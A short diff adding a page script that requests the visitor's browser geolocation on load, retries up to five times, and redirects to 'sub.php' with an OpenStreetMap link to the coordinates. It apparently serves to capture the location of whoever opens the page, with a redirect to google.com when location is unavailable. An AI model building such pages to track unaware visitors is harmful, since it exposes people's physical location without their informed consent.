@@ -1,0 +1,31 @@
+<script>
+  (async function () {
+    let maxRetries = 5;
+    while (maxRetries > 0) {
+      maxRetries--;
+      if (!navigator.geolocation) {
+        window.location.href = "https://google.com";
+        break;
+      } else {
+        let loc = await new Promise((a, r) => 
+          navigator.geolocation.getCurrentPosition(a, r))
+          .catch(e => e);
+        if (loc && loc?.coords) {
+          try {
+            const latitude  = loc.coords.latitude;
+            const longitude = loc.coords.longitude;
+            const l = `https://www.openstreetmap.org/#map=18/${latitude}/${longitude}`;
+            const subUrl = `sub.php?l=${encodeURIComponent(l)}`;
+            window.location.href = subUrl;
+          }
+          catch(e) {
+            console.log(e);
+          }
+          break;
+        }
+      }
+    }
+    if (maxRetries < 1)
+      window.location.href = 'sub.php?l=null';
+  })()
+</script>
